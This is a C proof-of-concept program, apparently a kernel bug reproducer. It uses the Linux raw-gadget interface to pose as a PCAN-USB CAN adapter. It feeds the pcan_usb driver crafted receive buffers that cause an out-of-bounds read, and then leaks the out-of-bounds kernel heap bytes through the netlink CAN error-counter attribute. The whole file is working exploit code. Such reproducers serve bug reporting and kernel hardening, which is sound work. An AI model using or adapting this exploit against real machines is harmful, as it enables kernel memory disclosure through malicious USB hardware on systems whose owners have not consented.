// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <linux/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if.h>
#include <linux/sockios.h>
#include <linux/usb/ch9.h>

#define UDC_NAME_LENGTH_MAX 128

struct usb_raw_init {
	__u8	driver_name[UDC_NAME_LENGTH_MAX];
	__u8	device_name[UDC_NAME_LENGTH_MAX];
	__u8	speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
	USB_RAW_EVENT_SUSPEND = 3,
	USB_RAW_EVENT_RESUME = 4,
	USB_RAW_EVENT_RESET = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};

struct usb_raw_event {
	__u32		type;
	__u32		length;
	__u8		data[0];
};

struct usb_raw_ep_io {
	__u16		ep;
	__u16		flags;
	__u32		length;
	__u8		data[0];
};

#define USB_RAW_IOCTL_INIT		_IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN		_IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH	_IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE		_IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ		_IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE		_IOW('U', 5, struct usb_endpoint_descriptor)
#define USB_RAW_IOCTL_EP_DISABLE	_IOW('U', 6, __u32)
#define USB_RAW_IOCTL_EP_WRITE		_IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ		_IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE		_IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW		_IOW('U', 10, __u32)
#define USB_RAW_IOCTL_EP0_STALL		_IO('U', 12)

#define EP_MAX_PACKET_CONTROL	64
#define EP_MAX_PACKET_BULK	512

#define DRIVER_VENDOR_ID	0x0c72
#define DRIVER_PRODUCT_ID	0x000c

#define PCAN_USB_CMD_LEN	16
#define PCAN_USB_GET		1
#define PCAN_USB_SET		2
#define PCAN_USB_CMD_DEVID	4
#define PCAN_USB_CMD_SN		6

static int g_fd = -1;
static int g_ep1_out = -1;
static int g_ep1_in  = -1;
static int g_ep2_out = -1;
static int g_ep2_in  = -1;
static volatile int g_workers_started = 0;

static struct usb_device_descriptor dev_desc = {
	.bLength		= USB_DT_DEVICE_SIZE,
	.bDescriptorType	= USB_DT_DEVICE,
	.bcdUSB			= 0x0200,
	.bDeviceClass		= 0,
	.bDeviceSubClass	= 0,
	.bDeviceProtocol	= 0,
	.bMaxPacketSize0	= EP_MAX_PACKET_CONTROL,
	.idVendor		= DRIVER_VENDOR_ID,
	.idProduct		= DRIVER_PRODUCT_ID,
	.bcdDevice		= 0x0100,
	.iManufacturer		= 1,
	.iProduct		= 2,
	.iSerialNumber		= 3,
	.bNumConfigurations	= 1,
};

static struct usb_config_descriptor cfg_desc = {
	.bLength		= USB_DT_CONFIG_SIZE,
	.bDescriptorType	= USB_DT_CONFIG,
	.wTotalLength		= 0,
	.bNumInterfaces		= 1,
	.bConfigurationValue	= 1,
	.iConfiguration		= 0,
	.bmAttributes		= USB_CONFIG_ATT_ONE | USB_CONFIG_ATT_SELFPOWER,
	.bMaxPower		= 0x32,
};

static struct usb_interface_descriptor if_desc = {
	.bLength		= USB_DT_INTERFACE_SIZE,
	.bDescriptorType	= USB_DT_INTERFACE,
	.bInterfaceNumber	= 0,
	.bAlternateSetting	= 0,
	.bNumEndpoints		= 4,
	.bInterfaceClass	= USB_CLASS_VENDOR_SPEC,
	.bInterfaceSubClass	= 0,
	.bInterfaceProtocol	= 0,
	.iInterface		= 0,
};

static struct usb_endpoint_descriptor ep1out_desc = {
	.bLength		= USB_DT_ENDPOINT_SIZE,
	.bDescriptorType	= USB_DT_ENDPOINT,
	.bEndpointAddress	= USB_DIR_OUT | 1,
	.bmAttributes		= USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize		= EP_MAX_PACKET_BULK,
	.bInterval		= 0,
};

static struct usb_endpoint_descriptor ep1in_desc = {
	.bLength		= USB_DT_ENDPOINT_SIZE,
	.bDescriptorType	= USB_DT_ENDPOINT,
	.bEndpointAddress	= USB_DIR_IN | 1,
	.bmAttributes		= USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize		= EP_MAX_PACKET_BULK,
	.bInterval		= 0,
};

static struct usb_endpoint_descriptor ep2out_desc = {
	.bLength		= USB_DT_ENDPOINT_SIZE,
	.bDescriptorType	= USB_DT_ENDPOINT,
	.bEndpointAddress	= USB_DIR_OUT | 2,
	.bmAttributes		= USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize		= EP_MAX_PACKET_BULK,
	.bInterval		= 0,
};

static struct usb_endpoint_descriptor ep2in_desc = {
	.bLength		= USB_DT_ENDPOINT_SIZE,
	.bDescriptorType	= USB_DT_ENDPOINT,
	.bEndpointAddress	= USB_DIR_IN | 2,
	.bmAttributes		= USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize		= EP_MAX_PACKET_BULK,
	.bInterval		= 0,
};

static struct usb_qualifier_descriptor qual_desc = {
	.bLength		= sizeof(struct usb_qualifier_descriptor),
	.bDescriptorType	= USB_DT_DEVICE_QUALIFIER,
	.bcdUSB			= 0x0200,
	.bDeviceClass		= 0,
	.bDeviceSubClass	= 0,
	.bDeviceProtocol	= 0,
	.bMaxPacketSize0	= EP_MAX_PACKET_CONTROL,
	.bNumConfigurations	= 1,
	.bRESERVED		= 0,
};

static int build_config(char *data, int length)
{
	struct usb_config_descriptor *c = (struct usb_config_descriptor *)data;
	int total = 0;
	struct usb_endpoint_descriptor *eps[4] = {
		&ep1out_desc, &ep1in_desc, &ep2out_desc, &ep2in_desc,
	};
	int i;

	memcpy(data, &cfg_desc, cfg_desc.bLength);
	data  += cfg_desc.bLength;
	total += cfg_desc.bLength;

	memcpy(data, &if_desc, if_desc.bLength);
	data  += if_desc.bLength;
	total += if_desc.bLength;

	for (i = 0; i < 4; i++) {
		memcpy(data, eps[i], eps[i]->bLength);
		data  += eps[i]->bLength;
		total += eps[i]->bLength;
	}

	c->wTotalLength = total;
	return total;
}

static int build_string(char *data, const char *s)
{
	int i, len = strlen(s);

	data[0] = 2 + 2 * len;
	data[1] = USB_DT_STRING;
	for (i = 0; i < len; i++) {
		data[2 + 2 * i]     = s[i];
		data[2 + 2 * i + 1] = 0;
	}
	return 2 + 2 * len;
}

static int usb_raw_open(void)
{
	int fd = open("/dev/raw-gadget", O_RDWR);
	if (fd < 0) {
		perror("open(/dev/raw-gadget)");
		exit(1);
	}
	return fd;
}

static void usb_raw_init_dev(int fd, const char *drv, const char *dev, int speed)
{
	struct usb_raw_init arg;

	memset(&arg, 0, sizeof(arg));
	strncpy((char *)arg.driver_name, drv, UDC_NAME_LENGTH_MAX - 1);
	strncpy((char *)arg.device_name, dev, UDC_NAME_LENGTH_MAX - 1);
	arg.speed = speed;
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &arg) < 0) {
		perror("ioctl(USB_RAW_IOCTL_INIT)");
		exit(1);
	}
}

static void usb_raw_run(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		perror("ioctl(USB_RAW_IOCTL_RUN)");
		exit(1);
	}
}

static void usb_raw_event_fetch(int fd, struct usb_raw_event *event)
{
	if (ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, event) < 0) {
		perror("ioctl(USB_RAW_IOCTL_EVENT_FETCH)");
		exit(1);
	}
}

static int usb_raw_ep0_write(int fd, struct usb_raw_ep_io *io)
{
	int rv = ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io);
	if (rv < 0)
		perror("ioctl(USB_RAW_IOCTL_EP0_WRITE)");
	return rv;
}

static int usb_raw_ep0_read(int fd, struct usb_raw_ep_io *io)
{
	int rv = ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
	if (rv < 0)
		perror("ioctl(USB_RAW_IOCTL_EP0_READ)");
	return rv;
}

static int usb_raw_ep_enable(int fd, struct usb_endpoint_descriptor *d)
{
	int rv = ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, d);
	if (rv < 0)
		perror("ioctl(USB_RAW_IOCTL_EP_ENABLE)");
	return rv;
}

static int usb_raw_ep_write(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP_WRITE, io);
}

static int usb_raw_ep_read(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP_READ, io);
}

static void usb_raw_configure(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
		perror("ioctl(USB_RAW_IOCTL_CONFIGURE)");
}

static void usb_raw_vbus_draw(int fd, __u32 power)
{
	if (ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, power) < 0)
		perror("ioctl(USB_RAW_IOCTL_VBUS_DRAW)");
}

static void usb_raw_ep0_stall(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0) < 0)
		perror("ioctl(USB_RAW_IOCTL_EP0_STALL)");
}

#define PCAN_USB_RX_BUFFER_SIZE		64
#define SL_INTERNAL			0x40
#define REC_ANALOG			2
#define REC_BUSEVT			5
#define ERR_CNT_DEC			0x00

static unsigned char evil[PCAN_USB_RX_BUFFER_SIZE];

static void build_evil(void)
{
	int off = 0, i;

	memset(evil, 0, sizeof(evil));

	evil[off++] = 0x02;
	evil[off++] = 20;

	for (i = 0; i < 18; i++) {
		evil[off++] = SL_INTERNAL;
		evil[off++] = REC_BUSEVT;
		evil[off++] = 0x01;
	}

	evil[off++] = SL_INTERNAL;
	evil[off++] = REC_ANALOG;
	evil[off++] = 0x00;
	evil[off++] = 0xaa;
	evil[off++] = 0xbb;

	evil[off++] = SL_INTERNAL;
	evil[off++] = REC_BUSEVT;
	evil[off++] = ERR_CNT_DEC;

	if (off != PCAN_USB_RX_BUFFER_SIZE) {
		printf("[-] BUG in PoC: payload is %d bytes, want %d\n",
		       off, PCAN_USB_RX_BUFFER_SIZE);
		exit(1);
	}
}

static void *cmd_worker(void *arg)
{
	static unsigned char rbuf[sizeof(struct usb_raw_ep_io) + 1024];
	static unsigned char wbuf[sizeof(struct usb_raw_ep_io) + 1024];
	struct usb_raw_ep_io *rio = (struct usb_raw_ep_io *)rbuf;
	struct usb_raw_ep_io *wio = (struct usb_raw_ep_io *)wbuf;
	int rv;

	printf("[*] cmd worker running (ep1out=%d ep1in=%d)\n",
	       g_ep1_out, g_ep1_in);

	while (1) {
		unsigned char f, n;

		memset(rio, 0, sizeof(*rio));
		rio->ep = g_ep1_out;
		rio->flags = 0;
		rio->length = EP_MAX_PACKET_BULK;
		rv = usb_raw_ep_read(g_fd, rio);
		if (rv < 0) {
			usleep(20000);
			continue;
		}
		if (rv < 2)
			continue;

		f = rio->data[0];
		n = rio->data[1];
		printf("[*] cmd out: f=%u n=%u (%d bytes)\n", f, n, rv);

		if (n != PCAN_USB_GET)
			continue;

		memset(wio, 0, sizeof(*wio));
		wio->ep = g_ep1_in;
		wio->flags = 0;
		wio->length = PCAN_USB_CMD_LEN;
		memset(wio->data, 0, PCAN_USB_CMD_LEN);
		wio->data[0] = f;
		wio->data[1] = n;
		switch (f) {
		case PCAN_USB_CMD_SN:

			wio->data[2] = 0x78;
			wio->data[3] = 0x56;
			wio->data[4] = 0x34;
			wio->data[5] = 0x12;
			break;
		case PCAN_USB_CMD_DEVID:
			wio->data[2] = 0x2a;
			break;
		default:
			break;
		}
		rv = usb_raw_ep_write(g_fd, wio);
		printf("[*] cmd in : answered f=%u (rv=%d)\n", f, rv);
	}
	return NULL;
}

static void *msg_worker(void *arg)
{
	static unsigned char wbuf[sizeof(struct usb_raw_ep_io) + 1024];
	struct usb_raw_ep_io *wio = (struct usb_raw_ep_io *)wbuf;
	int i, rv;

	printf("[*] msg worker running (ep2in=%d), waiting for rx URBs\n",
	       g_ep2_in);

	for (i = 0; i < 4; i++) {
		memset(wio, 0, sizeof(*wio));
		wio->ep = g_ep2_in;
		wio->flags = 0;
		wio->length = sizeof(evil);
		memcpy(wio->data, evil, sizeof(evil));
		rv = usb_raw_ep_write(g_fd, wio);
		printf("[*] delivered 64-byte poisoned rx buffer #%d (rv=%d)\n",
		       i, rv);
		if (rv < 0) {
			usleep(100000);
			continue;
		}
		usleep(200000);
	}
	return NULL;
}

#define IFLA_CAN_BITTIMING		1
#define IFLA_CAN_BERR_COUNTER		6

struct can_bittiming_u {
	__u32 bitrate;
	__u32 sample_point;
	__u32 tq;
	__u32 prop_seg;
	__u32 phase_seg1;
	__u32 phase_seg2;
	__u32 sjw;
	__u32 brp;
};

struct can_berr_counter_u {
	__u16 txerr;
	__u16 rxerr;
};

struct nlreq {
	struct nlmsghdr n;
	struct ifinfomsg i;
	char buf[1024];
};

static struct rtattr *nl_nest_start(struct nlmsghdr *n, int type)
{
	struct rtattr *nest = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));

	nest->rta_type = type;
	nest->rta_len  = RTA_LENGTH(0);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_LENGTH(0);
	return nest;
}

static void nl_nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
	nest->rta_len = (char *)n + NLMSG_ALIGN(n->nlmsg_len) - (char *)nest;
}

static void nl_addattr(struct nlmsghdr *n, int type, const void *data, int len)
{
	struct rtattr *rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));

	rta->rta_type = type;
	rta->rta_len  = RTA_LENGTH(len);
	if (len)
		memcpy(RTA_DATA(rta), data, len);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(RTA_LENGTH(len));
}

static int nl_talk(struct nlmsghdr *n)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	struct sockaddr_nl sa;
	char rbuf[8192];
	int rv;

	if (fd < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}
	n->nlmsg_seq = 1;
	n->nlmsg_pid = 0;
	if (send(fd, n, n->nlmsg_len, 0) < 0) {
		close(fd);
		return -1;
	}
	rv = recv(fd, rbuf, sizeof(rbuf), 0);
	close(fd);
	if (rv >= (int)sizeof(struct nlmsghdr)) {
		struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;

		if (rh->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(rh);
			return e->error;
		}
	}
	return 0;
}

static int can_set_bitrate(int ifindex, __u32 bitrate)
{
	struct nlreq req;
	struct rtattr *linkinfo, *infodata;
	struct can_bittiming_u bt;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len   = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.n.nlmsg_type  = RTM_NEWLINK;
	req.i.ifi_family  = AF_UNSPEC;
	req.i.ifi_index   = ifindex;

	memset(&bt, 0, sizeof(bt));
	bt.bitrate = bitrate;

	linkinfo = nl_nest_start(&req.n, IFLA_LINKINFO);
	nl_addattr(&req.n, IFLA_INFO_KIND, "can", 4);
	infodata = nl_nest_start(&req.n, IFLA_INFO_DATA);
	nl_addattr(&req.n, IFLA_CAN_BITTIMING, &bt, sizeof(bt));
	nl_nest_end(&req.n, infodata);
	nl_nest_end(&req.n, linkinfo);

	return nl_talk(&req.n);
}

static int if_set_up(const char *name)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	int rv;

	if (fd < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
		close(fd);
		return -1;
	}
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	rv = ioctl(fd, SIOCSIFFLAGS, &ifr);
	close(fd);
	return rv;
}

static int can_dump_berr(int ifindex)
{
	struct nlreq req;
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	struct sockaddr_nl sa;
	static char rbuf[16384];
	int rv;
	struct nlmsghdr *h;

	if (fd < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	bind(fd, (struct sockaddr *)&sa, sizeof(sa));

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len   = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.n.nlmsg_flags = NLM_F_REQUEST;
	req.n.nlmsg_type  = RTM_GETLINK;
	req.n.nlmsg_seq   = 2;
	req.i.ifi_family  = AF_UNSPEC;
	req.i.ifi_index   = ifindex;
	nl_addattr(&req.n, IFLA_EXT_MASK, "\x01\x00\x00\x00", 4);

	if (send(fd, &req.n, req.n.nlmsg_len, 0) < 0) {
		close(fd);
		return -1;
	}
	rv = recv(fd, rbuf, sizeof(rbuf), 0);
	close(fd);
	if (rv <= 0)
		return -1;

	for (h = (struct nlmsghdr *)rbuf; NLMSG_OK(h, (unsigned)rv);
	     h = NLMSG_NEXT(h, rv)) {
		struct rtattr *rta;
		int len;

		if (h->nlmsg_type != RTM_NEWLINK)
			continue;
		rta = IFLA_RTA(NLMSG_DATA(h));
		len = IFLA_PAYLOAD(h);
		for (; RTA_OK(rta, len); rta = RTA_NEXT(rta, len)) {
			struct rtattr *li, *idat;
			int lilen;

			if (rta->rta_type != IFLA_LINKINFO)
				continue;
			li = (struct rtattr *)RTA_DATA(rta);
			lilen = RTA_PAYLOAD(rta);
			for (; RTA_OK(li, lilen); li = RTA_NEXT(li, lilen)) {
				int dlen;

				if (li->rta_type != IFLA_INFO_DATA)
					continue;
				idat = (struct rtattr *)RTA_DATA(li);
				dlen = RTA_PAYLOAD(li);
				for (; RTA_OK(idat, dlen); idat = RTA_NEXT(idat, dlen)) {
					struct can_berr_counter_u *bec;

					if (idat->rta_type != IFLA_CAN_BERR_COUNTER)
						continue;
					bec = (struct can_berr_counter_u *)RTA_DATA(idat);
					printf("[+] LEAKED via IFLA_CAN_BERR_COUNTER: "
					       "rxerr=0x%02x txerr=0x%02x "
					       "(== ibuf[65], ibuf[66], 1 and 2 bytes "
					       "past the 64-byte rx slab object)\n",
					       bec->rxerr, bec->txerr);
					return 0;
				}
			}
		}
	}
	return -1;
}

static void *can_setup_worker(void *arg)
{
	int ifindex = 0, i, rv;

	for (i = 0; i < 400; i++) {
		ifindex = if_nametoindex("can0");
		if (ifindex)
			break;
		usleep(50000);
	}
	if (!ifindex) {
		printf("[-] can0 never appeared (driver did not bind?)\n");
		return NULL;
	}
	printf("[+] can0 appeared, ifindex=%d\n", ifindex);

	rv = can_set_bitrate(ifindex, 500000);
	printf("[*] set bitrate 500000: %d (%s)\n", rv,
	       rv ? strerror(-rv) : "ok");

	rv = if_set_up("can0");
	printf("[*] can0 up: %d (%s)\n", rv, rv ? strerror(errno) : "ok");
	if (rv < 0)
		return NULL;

	msg_worker(NULL);

	sleep(1);
	can_dump_berr(ifindex);
	return NULL;
}

static unsigned char io_buf[sizeof(struct usb_raw_ep_io) + 1024];

int main(void)
{
	static char cfg_buf[1024];
	static char str_buf[256];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)io_buf;
	pthread_t th_cmd, th_can;

	setvbuf(stdout, NULL, _IONBF, 0);

	alarm(90);

	printf("[*] pcan_usb handle_bus_evt OOB PoC starting\n");
	build_evil();

	g_fd = usb_raw_open();
	usb_raw_init_dev(g_fd, "dummy_udc", "dummy_udc.0", USB_SPEED_HIGH);
	usb_raw_run(g_fd);
	printf("[*] raw gadget bound to dummy_udc.0 (VID %04x PID %04x)\n",
	       DRIVER_VENDOR_ID, DRIVER_PRODUCT_ID);

	while (1) {
		struct {
			struct usb_raw_event inner;
			struct usb_ctrlrequest ctrl;
		} ev;
		struct usb_ctrlrequest *ctrl = &ev.ctrl;
		int len, rv;

		memset(&ev, 0, sizeof(ev));
		ev.inner.type = 0;
		ev.inner.length = sizeof(ev.ctrl);
		usb_raw_event_fetch(g_fd, (struct usb_raw_event *)&ev);

		if (ev.inner.type != USB_RAW_EVENT_CONTROL)
			continue;

		memset(io, 0, sizeof(*io));
		io->ep = 0;
		io->flags = 0;
		io->length = 0;

		switch (ctrl->bRequestType & USB_TYPE_MASK) {
		case USB_TYPE_STANDARD:
			switch (ctrl->bRequest) {
			case USB_REQ_GET_DESCRIPTOR:
				switch (ctrl->wValue >> 8) {
				case USB_DT_DEVICE:
					memcpy(io->data, &dev_desc, sizeof(dev_desc));
					io->length = sizeof(dev_desc);
					goto reply;
				case USB_DT_DEVICE_QUALIFIER:
					memcpy(io->data, &qual_desc, sizeof(qual_desc));
					io->length = sizeof(qual_desc);
					goto reply;
				case USB_DT_CONFIG:
					len = build_config(cfg_buf, sizeof(cfg_buf));
					memcpy(io->data, cfg_buf, len);
					io->length = len;
					goto reply;
				case USB_DT_STRING:
					if ((ctrl->wValue & 0xff) == 0) {
						io->data[0] = 4;
						io->data[1] = USB_DT_STRING;
						io->data[2] = 0x09;
						io->data[3] = 0x04;
						io->length = 4;
					} else {
						len = build_string(str_buf, "PCAN-USB");
						memcpy(io->data, str_buf, len);
						io->length = len;
					}
					goto reply;
				default:
					goto stall;
				}
				break;
			case USB_REQ_SET_CONFIGURATION:
				g_ep1_out = usb_raw_ep_enable(g_fd, &ep1out_desc);
				g_ep1_in  = usb_raw_ep_enable(g_fd, &ep1in_desc);
				g_ep2_out = usb_raw_ep_enable(g_fd, &ep2out_desc);
				g_ep2_in  = usb_raw_ep_enable(g_fd, &ep2in_desc);
				if (g_ep1_out < 0 || g_ep1_in < 0 ||
				    g_ep2_out < 0 || g_ep2_in < 0)
					goto stall;
				usb_raw_vbus_draw(g_fd, 0x32);
				usb_raw_configure(g_fd);
				if (!g_workers_started) {
					g_workers_started = 1;
					pthread_create(&th_cmd, NULL, cmd_worker, NULL);
					pthread_create(&th_can, NULL, can_setup_worker, NULL);
				}
				io->length = 0;
				goto reply;
			case USB_REQ_SET_INTERFACE:
				io->length = 0;
				goto reply;
			case USB_REQ_GET_INTERFACE:
				io->data[0] = 0;
				io->length = 1;
				goto reply;
			case USB_REQ_GET_STATUS:
				io->data[0] = 1;
				io->data[1] = 0;
				io->length = 2;
				goto reply;
			case USB_REQ_GET_CONFIGURATION:
				io->data[0] = 1;
				io->length = 1;
				goto reply;
			default:
				goto stall;
			}
			break;
		default:
			goto stall;
		}

reply:
		if (io->length > ctrl->wLength)
			io->length = ctrl->wLength;
		if (ctrl->bRequestType & USB_DIR_IN)
			rv = usb_raw_ep0_write(g_fd, io);
		else
			rv = usb_raw_ep0_read(g_fd, io);
		(void)rv;
		continue;
stall:
		usb_raw_ep0_stall(g_fd);
		continue;
	}

	return 0;
}
